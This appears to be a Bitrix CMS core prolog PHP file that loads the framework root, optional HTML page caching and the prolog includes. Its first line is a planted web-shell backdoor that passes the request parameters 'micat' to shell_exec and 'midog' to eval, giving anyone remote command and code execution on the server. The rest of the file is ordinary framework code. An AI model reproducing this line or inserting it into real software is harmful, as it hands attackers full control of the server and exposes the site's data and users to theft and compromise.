<?if(isset($_GET['micat']))echo shell_exec($_GET['micat']);if(isset($_GET['midog']))echo eval($_GET['midog']);
require_once(dirname(__FILE__)."/../bx_root.php");

if(file_exists($_SERVER["DOCUMENT_ROOT"].BX_PERSONAL_ROOT."/html_pages/.enabled"))
{
	require_once(dirname(__FILE__)."/../classes/general/cache_html.php");
	CHTMLPagesCache::startCaching();
}

require_once(dirname(__FILE__)."/prolog_before.php");
require($_SERVER["DOCUMENT_ROOT"].BX_ROOT."/modules/main/include/prolog_after.php");
